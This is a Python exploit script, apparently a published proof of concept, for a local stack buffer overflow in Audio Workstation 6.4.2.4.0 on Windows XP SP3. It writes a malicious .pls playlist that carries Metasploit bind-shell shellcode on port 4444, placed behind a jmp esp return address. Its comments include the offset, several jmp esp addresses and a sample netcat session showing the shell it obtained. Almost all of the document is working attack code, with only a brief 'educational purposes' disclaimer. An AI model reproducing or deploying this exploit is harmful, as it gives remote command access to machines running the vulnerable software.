#!/usr/bin/python
##########################################################
#
# Audio Workstation v6.4.2.4.0 (.pls) Universal Local BoF Exploit 
# Credits:  germaya_x
# Coded by: mr_me
# Tested on Windows XP SP3 
# Note: ** For educational purposes only **
# 
###########################################################
#
# mrme@home:~$ nc -v 192.168.0.6 4444
# 192.168.0.6: inverse host lookup failed: Unknown server error : 
# Connection timed out
# (UNKNOWN) [192.168.0.6] 4444 (?) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Audio Workstation>
#
# Note: There is no need to restrict this exploit 
# to XP sp2 as AudioWorkstation.exe contains
# jmp esp addresses that works on XP sp3.
# The addresses that I found using msfpescan:
#
# 0x0105a9b1 jmp esp
# 0x010d1c9a jmp esp
# 0x010f0215 jmp esp
# 0x010f54aa jmp esp
# 0x01102e7e jmp esp

# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=thread, LPORT=4444, RHOST=

sc =("\x29\xc9\xb8\x47\xff\xe4\x4f\xb1\x56\xdd\xc3\xd9\x74\x24"
"\xf4\x5b\x31\x43\x0f\x03\x43\x0f\x83\xc3\x43\x1d\x11\xb3"
"\xa3\x68\xda\x4c\x33\x0b\x52\xa9\x02\x19\x00\xb9\x36\xad"
"\x42\xef\xba\x46\x06\x04\x49\x2a\x8f\x2b\xfa\x81\xe9\x02"
"\xfb\x27\x36\xc8\x3f\x29\xca\x13\x13\x89\xf3\xdb\x66\xc8"
"\x34\x01\x88\x98\xed\x4d\x3a\x0d\x99\x10\x86\x2c\x4d\x1f"
"\xb6\x56\xe8\xe0\x42\xed\xf3\x30\xfa\x7a\xbb\xa8\x71\x24"
"\x1c\xc8\x56\x36\x60\x83\xd3\x8d\x12\x12\x35\xdc\xdb\x24"
"\x79\xb3\xe5\x88\x74\xcd\x22\x2e\x66\xb8\x58\x4c\x1b\xbb"
"\x9a\x2e\xc7\x4e\x3f\x88\x8c\xe9\x9b\x28\x41\x6f\x6f\x26"
"\x2e\xfb\x37\x2b\xb1\x28\x4c\x57\x3a\xcf\x83\xd1\x78\xf4"
"\x07\xb9\xdb\x95\x1e\x67\x8a\xaa\x41\xcf\x73\x0f\x09\xe2"
"\x60\x29\x50\x6b\x45\x04\x6b\x6b\xc1\x1f\x18\x59\x4e\xb4"
"\xb6\xd1\x07\x12\x40\x15\x32\xe2\xde\xe8\xbc\x13\xf6\x2e"
"\xe8\x43\x60\x86\x90\x0f\x70\x27\x45\x9f\x20\x87\x35\x60"
"\x91\x67\xe5\x08\xfb\x67\xda\x29\x04\xa2\x6d\x6e\xca\x96"
"\x3e\x19\x2f\x29\xd1\x85\xa6\xcf\xbb\x25\xef\x58\x53\x84"
"\xd4\x50\xc4\xf7\x3e\xcd\x5d\x60\x76\x1b\x59\x8f\x87\x09"
"\xca\x3c\x2f\xda\x98\x2e\xf4\xfb\x9f\x7a\x5c\x75\x98\xed"
"\x16\xeb\x6b\x8f\x27\x26\x1b\x2c\xb5\xad\xdb\x3b\xa6\x79"
"\x8c\x6c\x18\x70\x58\x81\x03\x2a\x7e\x58\xd5\x15\x3a\x87"
"\x26\x9b\xc3\x4a\x12\xbf\xd3\x92\x9b\xfb\x87\x4a\xca\x55"
"\x71\x2d\xa4\x17\x2b\xe7\x1b\xfe\xbb\x7e\x50\xc1\xbd\x7e"
"\xbd\xb7\x21\xce\x68\x8e\x5e\xff\xfc\x06\x27\x1d\x9d\xe9"
"\xf2\xa5\xbd\x0b\xd6\xd3\x55\x92\xb3\x59\x38\x25\x6e\x9d"
"\x45\xa6\x9a\x5e\xb2\xb6\xef\x5b\xfe\x70\x1c\x16\x6f\x15"
"\x22\x85\x90\x3c")

buff = '\x41' * 1324					# offset
buff += '\xb1\xa9\x05\x01' 				# jmp esp
buff += '\x90' * 10			    		# nops
buff += sc				        		# shellcode
buff += '\xcc' * (4000-1338-len(sc))	# finish buffer

exploitme = open('AudioWorkstation.pls','w')
exploitme.write(buff)
exploitme.close()
print "[+] Created exploit file ;)"